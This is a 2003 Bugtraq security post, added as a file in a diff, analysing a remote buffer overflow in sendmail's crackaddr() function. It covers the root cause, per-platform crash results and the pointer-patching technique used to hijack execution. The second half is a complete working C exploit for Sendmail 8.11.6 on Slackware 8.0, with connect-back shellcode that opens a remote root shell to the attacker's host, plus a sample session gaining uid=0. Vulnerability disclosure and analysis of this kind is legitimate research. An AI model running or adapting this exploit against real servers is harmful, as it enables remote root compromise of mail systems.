@@ -1,0 +1,717 @@
+
+Date: Tue, 4 Mar 2003 09:42:01 -0800
+From: Last Stage of Delirium <contact@...-pl.net>
+To: bugtraq@...urityfocus.com
+Subject: [LSD] Technical analysis of the remote sendmail vulnerability
+
+
+
+Hello,
+
+We have done some brief analysis of the potential remote Sendmail vulnerability
+that has been reported lately. Below you can read about our findings with regard
+to this isse. We reserve the right not to be correct in whatever we write below.
+This is mainly due to the fact that we did not perform full analysis of this
+issue. If this is the case, please correct any statements done by us in this
+post.
+
+TECHNICAL DESCRIPTION
+The vulnerability is within the crackaddr(char* addr) function defined in the
+headers.c file. By properly constructing the from address string and passing it
+to the crackaddr function it is possible to overrun the static char buf defined
+within this function. This overrun is possible due to the incorrect handling of
+the <> brackets chars in the from address string. Whenever the closing > bracket
+is encountered in the address string, the value of the buflim pointer (denoting
+the end of the buf buffer above which no write should be allowed) is incremented
+by 1. But, in the corresponding situation, whenever the opening < bracket is
+detected, the buflim value is not changed, although it should be decremented.
+And this is where the actual origin of the discussed security vulnerability
+lies.
+
+Because every closing bracket must be preceded by the opening one (this is
+assured by the anglelev value), we cannot just simply issue the sequence of N
+repeated < chars in order to increase the buflim value by N. Unfortunately,
+the <> two character sequence must be always used in order to increment the
+value of buflim by 1. This simply leads to the following equation which can be
+used for calculating the maximum x value by which the value of the buflim
+pointer can be incremented above the size of the buf buffer:
+
+        (2 * x) <= (MAXNAME + 1 - 7) + x
+        x <= (MAXNAME + 1 - 7)
+
+>From the above, it can be seen that the buflim value can go beyond the buf buffer
+at maximum by one times of its size (which is 250).
+
+EXPLOITATION
+Due to the nature of the overflowed buffer declaration (static), exploitation
+of this issue is highly dependant on the way compiler orders the static data in
+the data segment. In other words, there must be some usable static data immediately
+following our static buf, which when overflowed can disrupt the execution flow of
+the sendmail process in such a way thay program counter value can be fully controlled.
+
+We have inspected this issue a bit more, and found out that on most Unix systems
+the buf buffer is not followed by such data. We base this conclusion upon the
+simple fact that we didn't manage to crash sendmail by feeding it with 250
+sequences of <> chars in the from address string. This means that this issue does
+not seam to be exploitable on them. The following table presents a summary of
+our findings:
+
+Freebsd 4.4          - (default & self compiled Sendmail 8.11.6)  does not crash
+Solaris 8.0 x86      - (default & self compiled Sendmail 8.11.6)  does not crash
+Solaris 8.0 sparc    - (default & self compiled Sendmail 8.11.6)  does not crash
+HP-UX 10.20          - (self compiled Sendmail 8.11.6)            does not crash
+IRIX 6.5.14          - (self compiled Sendmail 8.11.6)		  does not crash
+AIX 4.3              - (binary of Sendmail 8.11.3 from bull.de)   does not crash
+RedHat 7.0           - (default Sendmail 8.11.0)                  does not crash
+RedHat 7.2           - (default Sendmail 8.11.6)                  does not crash
+RedHat 7.3     (p)   - (patched Sendmail 8.11.6)                  does not crash
+RedHat 7.0           - (self compiled Sendmail 8.11.6)            crashes
+RedHat 7.2           - (self compiled Sendmail 8.11.6)            crashes
+RedHat 7.3           - (self compiled Sendmail 8.11.6)            crashes
+Slackware  8.0 (p)   - (patched Sendmail 8.11.6 binary)           crashes
+Slackware  8.0       - (self compiled Sendmail 8.12.7)            does not crash
+RedHat 7.x           - (self compiled Sendmail 8.12.7)		  does not crash
+
+(p) - patched box
+
+>From the table above, you can see that there are however some systems that could
+be potentially exploitable. These are RedHat and Slackware Linux. We inspected
+the reason of the sendmail crashes on these systems and we have found out that
+they were due to the invalid value of the MciCache pointer defined in mci.c
+file. We investigated this issue a bit more and managed to successfully exploit
+this static buf overrun on Linux Slackware 8.0 systems. We achieved that by properly
+constructing the MciCache pointer value and some other pointer values as well.
+Specifically, we had to patch:
+
+- static MCI **MciCache pointer value to point to our struct mailer_con_info
+  entry,
+- struct mailer *mci_mailer pointer value from our MCI entry,
+- char *mci_host pointer value from our MCI entry,
+- FILE *mci_out pointer value from our MCI entry,
+
+By doing the above patching, we could reach the following execution point in
+the sendmail process:
+
+Program received signal SIGSEGV, Segmentation fault.
+0x400ee94a in _IO_vfprintf (s=0xaabbccdd, format=0x809b773 "%s%s",
+    ap=0xbfffd6ac) at vfprintf.c:1024
+1024    vfprintf.c: No such file or directory.
+(gdb) where
+#0  0x400ee94a in _IO_vfprintf (s=0xaabbccdd, format=0x809b773 "%s%s",
+    ap=0xbfffd6ac) at vfprintf.c:1024
+#1  0x400f7047 in fprintf (stream=0xaabbccdd, format=0x809b773 "%s%s")
+    at fprintf.c:32
+#2  0x8084ff8 in smtpmessage ()
+#3  0x80847ac in smtpquit ()
+#4  0x8069e89 in mci_uncache ()
+#5  0x8069f14 in mci_flush ()
+#6  0x804e0b9 in finis ()
+#7  0x8073042 in dowork ()
+#8  0x807f9bc in smtp ()
+#9  0x804da8e in main ()
+#10 0x400c19cb in __libc_start_main (main=0x804ac00 <main>, argc=3,
+    argv=0xbffffbe4, init=0x804a07c <_init>, fini=0x808918c <_fini>,
+    rtld_fini=0x4000ae60 <_dl_fini>, stack_end=0xbffffbdc)
+    at ../sysdeps/generic/libc-start.c:92
+
+As you can see, we managed to reach the point where fprintf function call was
+done with our value of a FILE* stream pointer.
+
+>From this point, we had to do a bit more patching in order to finally seize
+control over the sendmail process. Specifically, we used the fact that the
+_IO_FILE (or FILE) object is followed by a pointer to a jump table (of pointers
+to functions) in GNU libc. This simply lead us to the following patching scheme:
+
+- pointer value of a stream parameter passed to the fprintf call was patched, so
+  that it pointed to our FILE object,
+- int _flags field from the FILE object, was patched so that its 0x08 bit was
+  cleared,
+- signed char _vtable_offset value was patched, so that along with the
+  struct _IO_jump_t *vtable it caused that our jump table was accesssed for file
+  IO operations,
+- _IO_xsputn_t __xsputn function pointer value was patched, so that it contained
+  the value which we wanted to have in program counter register.
+
+By doing this additional FILE object related patching, we were able to reach the
+following execution point in the sendmail process:
+
+Program received signal SIGSEGV, Segmentation fault.
+0xaabbccdd in ?? ()
+(gdb) where
+#0  0xaabbccdd in ?? ()
+#1  0x400f7047 in fprintf (stream=0xbfffa260, format=0x809b773 "%s%s")
+    at fprintf.c:32
+#2  0x8084ff8 in smtpmessage ()
+#3  0x80847ac in smtpquit ()
+#4  0x8069e89 in mci_uncache ()
+#5  0x8069f14 in mci_flush ()
+#6  0x804e0b9 in finis ()
+#7  0x8073042 in dowork ()
+#8  0x807f9bc in smtp ()
+#9  0x804da8e in main ()
+#10 0x400c19cb in __libc_start_main (main=0x804ac00 <main>, argc=3,
+    argv=0xbffffbe4, init=0x804a07c <_init>, fini=0x808918c <_fini>,
+    rtld_fini=0x4000ae60 <_dl_fini>, stack_end=0xbffffbdc)
+    at ../sysdeps/generic/libc-start.c:92
+
+In a result, we were able to redirect sendmail program execution to any arbitrary
+location (our code in particular).
+
+We wrote simple proof of concept code for Linux Slackware 8.0 that does all
+of the above. It can be found at the end of this post. The code was written in
+such a way so that all of the patching is done almost automatically. The user
+does not explixitly specify the locations within the patching buffer - they
+are found on the fly upon the knowledge about the beginning location of the patched
+buffer and its structure (free/occupied slots). We decided to do the patching in
+such a way in order to avoid dealing with illegal characters in the patching
+pointers. We also wanted to extend the chance of hitting the table of pointers
+to our MCI entries (we wanted to have as many of them as possible in the
+patching buf, and all of them in one continuous area). By doing this, we could
+reduce the need to brute force the MciCache pointer value several times (from
+4-10).
+
+As for some other issues regarding the sendmail vulnerability exploitation, it
+should be mentioned that the user provided from address string can trigger the
+overrun in two cases. The first one is when this string is provided directly
+in a MAIL FROM smtp command, the second one is when it is provided in the
+message body (as the extended From: header field). However, this second way of
+triggering the overflow seem to be more adventageous, as there is much more room
+available for the from address string contained in the message body than the
+smtp command (about 2k contrary to 256 bytes). There are also some restrictions
+imposed on the from address string when it is provided in the smtp command in
+sendmail 8.12.x and above, which cannot be simply avoided (in order to pass our
+arbitrary characters in the from address string, we enclose them in the comment
+() paranthesis).
+
+One more issue with regard to the exploitation is related to the code that can
+be executed after successfull exploitation. Because the target process does not
+have any active TCP connections open at the time when we can seize its execution
+we cannot use findsckcode variant in it. The use of bindsckcode does not also
+seem to be usable in the case of sendmail, as mail servers are usually tightly
+firewalled and do not allow any incoming connections to be established. They
+however must always allow outgoing connections to other mail servers, this is
+why the connect code could be very adventageous in this case and this is why we
+use it in our POC.
+
+TESTING ENVIROMENT
+Our test box was running Linux Slackware 8.0 distribution
+(ftp.slackware.org/slackware/slackware-8.0-iso/install.iso) with patched sendmail
+binary (ftp.slackware.org/slackware/slackware-8.0/patches/packages/sendmail.tgz).
+The applied patch upgraded sendmail from version 8.11.4 to 8.11.6.
+
+Below you can find the example usage of our proof of concept code:
+
+# ./linx86_sendmail your.target.com -p 0xbfff9f1c -v 80
+copyright LAST STAGE OF DELIRIUM mar 2003 poland //lsd-pl.net/
+sendmail 8.11.6 for Slackware 8.0 x86
+
+.................
+base 0xbfffa00c mcicache 0xbfffa01c
+Linux your.target.com 2.2.19 #93 Thu Jun 21 01:09:03 PDT 2001 i686 unknown
+id
+uid=0(root) gid=1(bin) groups=7(lp)
+
+
+IMPACT
+Due to the nature of the discussed sendmail vulnerability it seems that it is
+unexploitable on most of commercially available UNIX systems. It also doesn't seem
+to be exploitable on most of the default SMTP installations of x86 based open-source
+systems. This leads to the conclusion that the overall impact of the vulnerability
+is rather limited and not so significant as it might be thought.
+
+Hovever, we cannot exclude that there does not exist another execution path in the
+sendmail code, that could lead to the program counter overwrite.
+
+
+PROOF OF CONCEPT CODE
+
+/*## copyright LAST STAGE OF DELIRIUM mar 2003 poland        *://lsd-pl.net/ #*/
+/*## sendmail 8.11.6                                                         #*/
+
+/* proof of concept code for remote sendmail vulnerability                    */
+/* usage: linx86_sendmail target [-l localaddr] [-b localport] [-p ptr]       */
+/*                               [-c count] [-t timeout] [-v 80]              */
+/* where:                                                                     */
+/*   target - address of the target host to run this code against             */
+/*   localaddr - address of the host you are running this code from           */
+/*   localport - local port that will listen for shellcode connection         */
+/*   ptr - base ptr of the sendmail buffer containing our arbitrary data      */
+/*   count - brute force loop counter                                         */
+/*   timeout - select call timeout while waiting for shellcode connection     */
+/*   v - version of the target OS (currently only Slackware 8.0 is supported) */
+/*                                                                            */
+
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <sys/time.h>
+#include <netinet/in.h>
+#include <unistd.h>
+#include <netdb.h>
+#include <stdio.h>
+#include <fcntl.h>
+#include <errno.h>
+
+#define NOP  0xf8
+
+#define MAXLINE 2048
+#define PNUM    12
+
+#define OFF1 (288+156-12)
+#define OFF2 (1088+288+156+20+48)
+#define OFF3 (139*2)
+
+int tab[]={23,24,25,26};
+
+#define IDX2PTR(i) (PTR+i-OFF1)
+#define ALLOCBLOCK(idx,size) memset(&lookup[idx],1,size)
+
+#define NOTVALIDCHAR(c) (((c)==0x00)||((c)==0x0d)||((c)==0x0a)||((c)==0x22)||\
+                        (((c)&0x7f)==0x24)||(((c)>=0x80)&&((c)<0xa0)))
+
+#define AOFF 33
+#define AMSK 38
+#define POFF 48
+#define PMSK 53
+
+char* lookup=NULL;
+int   gfirst;
+
+char shellcode[]=               /* 116 bytes                      */
+    "\xeb\x02"                  /* jmp    <shellcode+4>           */
+    "\xeb\x08"                  /* jmp    <shellcode+12>          */
+    "\xe8\xf9\xff\xff\xff"      /* call   <shellcode+2>           */
+    "\xcd\x7f"                  /* int    $0x7f                   */
+    "\xc3"                      /* ret                            */
+    "\x5f"                      /* pop    %edi                    */
+    "\xff\x47\x01"              /* incl   0x1(%edi)               */
+    "\x31\xc0"                  /* xor    %eax,%eax               */
+    "\x50"                      /* push   %eax                    */
+    "\x6a\x01"                  /* push   $0x1                    */
+    "\x6a\x02"                  /* push   $0x2                    */
+    "\x54"                      /* push   %esp                    */
+    "\x59"                      /* pop    %ecx                    */
+    "\xb0\x66"                  /* mov    $0x66,%al               */
+    "\x31\xdb"                  /* xor    %ebx,%ebx               */
+    "\x43"                      /* inc    %ebx                    */
+    "\xff\xd7"                  /* call   *%edi                   */
+    "\xba\xff\xff\xff\xff"      /* mov    $0xffffffff,%edx        */
+    "\xb9\xff\xff\xff\xff"      /* mov    $0xffffffff,%ecx        */
+    "\x31\xca"                  /* xor    %ecx,%edx               */
+    "\x52"                      /* push   %edx                    */
+    "\xba\xfd\xff\xff\xff"      /* mov    $0xfffffffd,%edx        */
+    "\xb9\xff\xff\xff\xff"      /* mov    $0xffffffff,%ecx        */
+    "\x31\xca"                  /* xor    %ecx,%edx               */
+    "\x52"                      /* push   %edx                    */
+    "\x54"                      /* push   %esp                    */
+    "\x5e"                      /* pop    %esi                    */
+    "\x6a\x10"                  /* push   $0x10                   */
+    "\x56"                      /* push   %esi                    */
+    "\x50"                      /* push   %eax                    */
+    "\x50"                      /* push   %eax                    */
+    "\x5e"                      /* pop    %esi                    */
+    "\x54"                      /* push   %esp                    */
+    "\x59"                      /* pop    %ecx                    */
+    "\xb0\x66"                  /* mov    $0x66,%al               */
+    "\x6a\x03"                  /* push   $0x3                    */
+    "\x5b"                      /* pop    %ebx                    */
+    "\xff\xd7"                  /* call   *%edi                   */
+    "\x56"                      /* push   %esi                    */
+    "\x5b"                      /* pop    %ebx                    */
+    "\x31\xc9"                  /* xor    %ecx,%ecx               */
+    "\xb1\x03"                  /* mov    $0x3,%cl                */
+    "\x31\xc0"                  /* xor    %eax,%eax               */
+    "\xb0\x3f"                  /* mov    $0x3f,%al               */
+    "\x49"                      /* dec    %ecx                    */
+    "\xff\xd7"                  /* call   *%edi                   */
+    "\x41"                      /* inc    %ecx                    */
+    "\xe2\xf6"                  /* loop   <shellcode+81>          */
+    "\x31\xc0"                  /* xor    %eax,%eax               */
+    "\x50"                      /* push   %eax                    */
+    "\x68\x2f\x2f\x73\x68"      /* push   $0x68732f2f             */
+    "\x68\x2f\x62\x69\x6e"      /* push   $0x6e69622f             */
+    "\x54"                      /* push   %esp                    */
+    "\x5b"                      /* pop    %ebx                    */
+    "\x50"                      /* push   %eax                    */
+    "\x53"                      /* push   %ebx                    */
+    "\x54"                      /* push   %esp                    */
+    "\x59"                      /* pop    %ecx                    */
+    "\x31\xd2"                  /* xor    %edx,%edx               */
+    "\xb0\x0b"                  /* mov    $0xb,%al                */
+    "\xff\xd7"                  /* call   *%edi                   */
+;
+
+int PTR,MPTR=0xbfffa01c;
+
+void putaddr(char* p,int i) {
+ *p++=(i&0xff);
+ *p++=((i>>8)&0xff);
+ *p++=((i>>16)&0xff);
+ *p++=((i>>24)&0xff);
+}
+
+void sendcommand(int sck,char *data,char resp) {
+ char buf[1024];
+ int i;
+ if (send(sck,data,strlen(data),0)<0) {
+  perror("error");exit(-1);
+ }
+ if (resp) {
+  if ((i=recv(sck,buf,sizeof(buf),0))<0) {
+   perror("error");exit(-1);
+  }
+  buf[i]=0;
+  printf("%s",buf);
+ }
+}
+
+int rev(int a){
+ int i=1;
+ if((*(char*)&i)) return(a);
+ return((a>>24)&0xff)|(((a>>16)&0xff)<<8)|(((a>>8)&0xff)<<16)|((a&0xff)<<24);
+}
+
+void initlookup() {
+ int i;
+ if (!(lookup=(char*)malloc(MAXLINE))) {
+  printf("error: malloc\n");exit(-1);
+ }
+ ALLOCBLOCK(0,MAXLINE);
+ memset(lookup+OFF1,0,OFF2-OFF1);
+
+ for(i=0;i<sizeof(tab)/4;i++)
+  ALLOCBLOCK(OFF1+4*tab[i],4);
+
+ gfirst=1;
+}
+
+int validaddr(int addr) {
+ unsigned char buf[4],c;
+ int i,*p=(int*)buf;
+ *p=addr;
+ for(i=0;i<4;i++) {
+  c=buf[i];
+  if (NOTVALIDCHAR(c)) return 0;
+ }
+ return 1;
+}
+
+int freeblock(int idx,int size) {
+ int i,j;
+ for(i=j=0;i<size;i++) {
+  if (!lookup[idx+i]) j++;
+ }
+ return (i==j);
+}
+
+int findblock(int addr,int size,int begin) {
+ int i,j,idx,ptr;
+ ptr=addr;
+ if (begin) {
+  idx=OFF1+addr-PTR;
+  while(1) {
+   while(((!validaddr(ptr))||lookup[idx])&&(idx<OFF2)) {
+    idx+=4;
+    ptr+=4;
+   }
+   if (idx>=OFF2) return 0;
+   if (freeblock(idx,size)) return idx;
+   idx+=4;
+   ptr+=4;
+  }
+ } else {
+  idx=addr-PTR;
+  while(1) {
+   while(((!validaddr(ptr))||lookup[idx])&&(idx>OFF1)) {
+    idx-=4;
+    ptr-=4;
+   }
+   if (idx<OFF1) return 0;
+   if (freeblock(idx,size)) return idx;
+   idx-=4;
+   ptr-=4;
+  }
+ }
+}
+
+int findsblock(int sptr) {
+ int optr,sidx,size;
+
+ size=gfirst ? 0x2c:0x04;
+ optr=sptr;
+ while(sidx=findblock(sptr,size,1)) {
+  sptr=IDX2PTR(sidx);
+  if (gfirst) {
+   if (validaddr(sptr)) {
+    ALLOCBLOCK(sidx,size);
+    break;
+   } else sptr=optr;
+  } else {
+   if (validaddr(sptr-0x18)&&freeblock(sidx-0x18,4)&&freeblock(sidx+0x0c,4)&&
+       freeblock(sidx+0x10,4)&&freeblock(sidx-0x0e,4)) {
+    ALLOCBLOCK(sidx-0x18,4);
+    ALLOCBLOCK(sidx-0x0e,2);
+    ALLOCBLOCK(sidx,4);
+    ALLOCBLOCK(sidx+0x0c,4);
+    ALLOCBLOCK(sidx+0x10,4);
+    sidx-=0x18;
+    break;
+   } else sptr=optr;
+  }
+  sptr+=4;
+  optr=sptr;
+  }
+ gfirst=0;
+ return sidx;
+}
+
+int findfblock(int fptr,int i1,int i2,int i3) {
+ int fidx,optr;
+ optr=fptr;
+ while(fidx=findblock(fptr,4,0)) {
+  fptr=IDX2PTR(fidx);
+  if (validaddr(fptr-i2)&&validaddr(fptr-i2-i3)&&freeblock(fidx-i3,4)&&
+      freeblock(fidx-i2-i3,4)&&freeblock(fidx-i2-i3+i1,4)) {
+   ALLOCBLOCK(fidx,4);
+   ALLOCBLOCK(fidx-i3,4);
+   ALLOCBLOCK(fidx-i2-i3,4);
+   ALLOCBLOCK(fidx-i2-i3+i1,4);
+   break;
+  } else fptr=optr;
+  fptr-=4;
+  optr=fptr;
+ }
+ return fidx;
+}
+
+void findvalmask(char* val,char* mask,int len) {
+ int i;
+ unsigned char c,m;
+ for(i=0;i<len;i++) {
+  c=val[i];
+  m=0xff;
+  while(NOTVALIDCHAR(c^m)||NOTVALIDCHAR(m)) m--;
+  val[i]=c^m;
+  mask[i]=m;
+ }
+}
+
+void initasmcode(char *addr,int port) {
+ char abuf[4],amask[4],pbuf[2],pmask[2];
+ char name[256];
+ struct hostent *hp;
+ int i;
+
+ if (!addr) gethostname(name,sizeof(name));
+  else strcpy(name,addr);
+
+ if ((i=inet_addr(name))==-1) {
+  if ((hp=gethostbyname(name))==NULL) {
+   printf("error: address\n");exit(-1);
+  }
+  memcpy(&i,hp->h_addr,4);
+ }
+
+ putaddr(abuf,rev(i));
+
+ pbuf[0]=(port>>8)&0xff;
+ pbuf[1]=(port)&0xff;
+
+ findvalmask(abuf,amask,4);
+ findvalmask(pbuf,pmask,2);
+
+ memcpy(&shellcode[AOFF],abuf,4);
+ memcpy(&shellcode[AMSK],amask,4);
+ memcpy(&shellcode[POFF],pbuf,2);
+ memcpy(&shellcode[PMSK],pmask,2);
+}
+
+int main(int argc,char **argv){
+    int sck,srv,i,j,cnt,jidx,aidx,sidx,fidx,aptr,sptr,fptr,ssize,fsize,jmp;
+    int c,l,i1,i2,i3,i4,found,vers=80,count=256,timeout=1,port=25;
+    fd_set readfs;
+    struct timeval t;
+    struct sockaddr_in address;
+    struct hostent *hp;
+    char buf[4096],cmd[4096];
+    char *p,*host,*myhost=NULL;
+
+    printf("copyright LAST STAGE OF DELIRIUM mar 2003 poland //lsd-pl.net/\n");
+    printf("sendmail 8.11.6 for Slackware 8.0 x86\n\n");
+
+    if (argc<3) {
+     printf("usage: %s target [-l localaddr] [-b localport] [-p ptr] [-c count] [-t timeout] [-v 80]\n",argv[0]);
+     exit(-1);
+    }
+
+    while((c=getopt(argc-1,&argv[1],"b:c:l:p:t:v:"))!=-1) {
+     switch(c) {
+      case 'b': port=atoi(optarg);break;
+      case 'c': count=atoi(optarg);break;
+      case 'l': myhost=optarg;break;
+      case 't': timeout=atoi(optarg);break;
+      case 'v': vers=atoi(optarg);break;
+      case 'p': sscanf(optarg,"%x",&MPTR);
+     }
+    }
+
+    host=argv[1];
+
+    srv=socket(AF_INET,SOCK_STREAM,0);
+    bzero(&address,sizeof(address));
+    address.sin_family=AF_INET;
+    address.sin_port=htons(port);
+    if (bind(srv,(struct sockaddr*)&address,sizeof(address))==-1) {
+     printf("error: bind\n");exit(-1);
+    }
+    if (listen(srv,10)==-1) {
+     printf("error: listen\n");exit(-1);
+    }
+
+    initasmcode(myhost,port);
+
+    for(i4=0;i4<count;i4++,MPTR+=cnt*4) {
+     PTR=MPTR;
+     sck=socket(AF_INET,SOCK_STREAM,0);
+     bzero(&address,sizeof(address));
+     address.sin_family=AF_INET;
+     address.sin_port=htons(25);
+     if ((address.sin_addr.s_addr=inet_addr(host))==-1) {
+      if ((hp=gethostbyname(host))==NULL) {
+       printf("error: address\n");exit(-1);
+      }
+      memcpy(&address.sin_addr.s_addr,hp->h_addr,4);
+     }
+     if (connect(sck,(struct sockaddr*)&address,sizeof(address))==-1) {
+      printf("error: connect\n");exit(-1);
+     }
+     initlookup();
+
+     sendcommand(sck,"helo yahoo.com\n",0);
+     sendcommand(sck,"mail from: anonymous@...oo.com\n",0);
+     sendcommand(sck,"rcpt to: lp\n",0);
+     sendcommand(sck,"data\n",0);
+
+     aidx=findblock(PTR,PNUM*4,1);
+     ALLOCBLOCK(aidx,PNUM*4);
+     aptr=IDX2PTR(aidx);
+
+     printf(".");fflush(stdout);
+
+     jidx=findblock(PTR,strlen(shellcode)+PNUM*4,1);
+     ALLOCBLOCK(jidx,strlen(shellcode)+PNUM*4);
+
+     switch(vers) {
+      case 80: l=28;i1=0x46;i2=0x94;i3=0x1c;break;
+      default: exit(-1);
+     }
+
+     i2-=8;
+
+     p=buf;
+     for(i=0;i<138;i++) {
+      *p++='<';*p++='>';
+     }
+     *p++='(';
+     for(i=0;i<l;i++) *p++=NOP;
+     *p++=')';
+     *p++=0;
+
+     putaddr(&buf[OFF3+l],aptr);
+     sprintf(cmd,"From: %s\n",buf);
+     sendcommand(sck,cmd,0);
+     sendcommand(sck,"Subject: hello\n",0);
+     memset(cmd,NOP,MAXLINE);
+     cmd[MAXLINE-2]='\n';
+     cmd[MAXLINE-1]=0;
+
+     cnt=0;
+
+     while(cnt<PNUM) {
+      sptr=aptr;
+      fptr=IDX2PTR(OFF2);
+
+      if (!(sidx=findsblock(sptr))) break;
+      sptr=IDX2PTR(sidx);
+      if (!(fidx=findfblock(fptr,i1,i2,i3))) break;
+      fptr=IDX2PTR(fidx);
+
+      jmp=IDX2PTR(jidx);
+      while (!validaddr(jmp)) jmp+=4;
+
+      putaddr(&cmd[aidx],sptr);
+      putaddr(&cmd[sidx+0x24],aptr);
+      putaddr(&cmd[sidx+0x28],aptr);
+      putaddr(&cmd[sidx+0x18],fptr-i2-i3);
+
+      putaddr(&cmd[fidx-i2-i3],0x01010101);
+      putaddr(&cmd[fidx-i2-i3+i1],0xfffffff8);
+
+      putaddr(&cmd[fidx-i3],fptr-i3);
+      putaddr(&cmd[fidx],jmp);
+
+      aidx+=4;
+      PTR-=4;
+      cnt++;
+     }
+
+     p=&cmd[jidx+4*PNUM];
+      for(i=0;i<strlen(shellcode);i++) {
+      *p++=shellcode[i];
+     }
+     sendcommand(sck,cmd,0);
+     sendcommand(sck,"\n",0);
+     sendcommand(sck,".\n",0);
+     free(lookup);
+
+     FD_ZERO(&readfs);
+     FD_SET(0,&readfs);
+     FD_SET(srv,&readfs);
+
+     t.tv_sec=timeout;
+     t.tv_usec=0;
+
+     if (select(srv+1,&readfs,NULL,NULL,&t)>0) {
+      close(sck);
+      found=1;
+      if ((sck=accept(srv,(struct sockaddr*)&address,&l))==-1) {
+        printf("error: accept\n");exit(-1);
+      }
+      close(srv);
+
+      printf("\nbase 0x%08x mcicache 0x%08x\n",PTR,aptr);
+
+      write(sck,"/bin/uname -a\n",14);
+     } else {
+      close(sck);
+      found=0;
+     }
+
+     while(found){
+        FD_ZERO(&readfs);
+        FD_SET(0,&readfs);
+        FD_SET(sck,&readfs);
+        if(select(sck+1,&readfs,NULL,NULL,NULL)){
+            int cnt;
+            char buf[1024];
+            if(FD_ISSET(0,&readfs)){
+                if((cnt=read(0,buf,1024))<1){
+                    if(errno==EWOULDBLOCK||errno==EAGAIN) continue;
+                     else {printf("koniec\n");exit(-1);}
+                }
+                write(sck,buf,cnt);
+            }
+            if(FD_ISSET(sck,&readfs)){
+                if((cnt=read(sck,buf,1024))<1){
+                     if(errno==EWOULDBLOCK||errno==EAGAIN) continue;
+                     else {printf("koniec\n");exit(-1);}
+                }
+                write(1,buf,cnt);
+            }
+        }
+    }
+  }
+}
+
+
+
+
